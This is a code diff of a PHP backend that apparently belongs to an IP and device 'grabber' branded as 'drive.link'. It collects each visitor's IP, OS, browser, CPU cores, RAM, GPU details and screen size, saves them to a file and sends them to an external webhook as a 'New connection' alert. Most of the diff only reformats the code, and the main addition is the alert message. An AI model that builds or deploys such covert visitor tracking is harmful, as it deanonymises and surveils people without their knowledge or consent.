@@ -1,7 +1,6 @@
 <?php
 include("webhook.php");
-header('Content-Type: text/html');
-{
+header('Content-Type: text/html'); {
   $ptf = $_POST['Ptf'];
   $brw = $_POST['Brw'];
   $cc = $_POST['Cc'];
@@ -15,8 +14,7 @@ header('Content-Type: text/html');
   function getUserIP()
   {
     // Get real visitor IP
-    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
-    {
+    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
       $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
       $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
     }
@@ -24,17 +22,12 @@ header('Content-Type: text/html');
     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
     $remote  = $_SERVER['REMOTE_ADDR'];
 
-    if(filter_var($client, FILTER_VALIDATE_IP))
-    {
-        $ip = $client;
-    }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP))
-    {
-        $ip = $forward;
-    }
-    else
-    {
-        $ip = $remote;
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
+      $ip = $client;
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
+      $ip = $forward;
+    } else {
+      $ip = $remote;
     }
     return $ip;
   }
@@ -43,21 +36,64 @@ header('Content-Type: text/html');
   //
   $data['dev'] = array();
 
-  $data['dev'][] = array('platform' => $ptf,
-  'browser' => $brw,
-  'cores' => $cc,
-  'ram' => $ram,
-  'vendor' => $ven,
-  'render' => $ren,
-  'ip' => $ip,
-  'ht' => $ht,
-  'wd' => $wd,
-  'os' => $os);
+  $data['dev'][] = array(
+    'platform' => $ptf,
+    'browser' => $brw,
+    'cores' => $cc,
+    'ram' => $ram,
+    'vendor' => $ven,
+    'render' => $ren,
+    'ip' => $ip,
+    'ht' => $ht,
+    'wd' => $wd,
+    'os' => $os
+  );
 
   $jdata = json_encode($data);
 
   $f = fopen('info.txt', 'w+');
   fwrite($f, $jdata);
   fclose($f);
-  sendWebhook($jdata);
+  $jdatastr = <<<EOD
+  {
+    "content": null,
+    "embeds": [
+      {
+        "title": "Client information",
+        "description": "That's the information we've gathered so far.",
+        "color": 16736088,
+        "fields": [
+          {
+            "name": "Operating System",
+            "value": "$os",
+            "inline": true
+          },
+          {
+            "name": "Cores",
+            "value": "$cc",
+            "inline": true
+          },
+          {
+            "name": "Browser",
+            "value": "$brw",
+            "inline": true
+          },
+          {
+            "name": "IP",
+            "value": "[$ip](https://check-host.net/ip-info?host=$ip)",
+            "inline": true
+          }
+        ],
+        "author": {
+          "name": "[drive.link] New connection.",
+          "url": "https://drive.link"
+        },
+        "footer": {
+          "text": "drive.link"
+        }
+      }
+    ]
+  }
+  EOD;
+  die(sendWebhook($jdatastr));
 }
